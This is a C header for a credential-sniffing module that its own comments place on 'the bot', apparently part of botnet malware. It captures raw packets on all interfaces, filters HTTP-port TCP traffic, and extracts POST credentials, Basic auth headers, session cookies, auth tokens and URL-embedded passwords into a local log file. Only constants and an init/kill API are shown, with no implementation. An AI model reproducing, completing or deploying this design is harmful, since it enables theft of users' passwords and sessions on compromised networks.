#pragma once

/*
 * sniffer.h — Passive network credential sniffer
 *
 * Captures raw packets on all interfaces via AF_PACKET.
 * Filters: len >= 150 → IPv4 → TCP → HTTP ports → credential extraction.
 * Writes hits to a local log file on the bot. No CNC reporting.
 * Flushes buffer every ~70 seconds or on stop.
 */

#include <stdint.h>

/* Minimum packet size to process (filters out noise: ARP, DNS, ACKs, keepalives) */
#define SNIFF_MIN_PKT       150

/* HTTP ports to inspect */
#define SNIFF_PORT_HTTP      80
#define SNIFF_PORT_HTTP_ALT  8080
#define SNIFF_PORT_HTTP_ALT2 8443
#define SNIFF_PORT_HTTP_ALT3 8888

/* Max credential string lengths */
#define SNIFF_MAX_USER  128
#define SNIFF_MAX_PASS  128

/* Buffered hits before forced flush */
#define SNIFF_MAX_HITS  256

/* Flush interval in seconds (~70s) */
#define SNIFF_FLUSH_INTERVAL 70

/* Hit types */
#define SNIFF_TYPE_POST_CRED  1    /* POST body credential (user=&pass=) */
#define SNIFF_TYPE_BASIC_AUTH 2    /* Authorization: Basic header */
#define SNIFF_TYPE_COOKIE     3    /* Session cookie / auth token */
#define SNIFF_TYPE_URL_CRED   4    /* ?user=...&pass=... in URL query  */

/* Module API — logpath = where to write captured creds on the local filesystem */
void sniffer_init(const char *logpath);
void sniffer_kill(void);
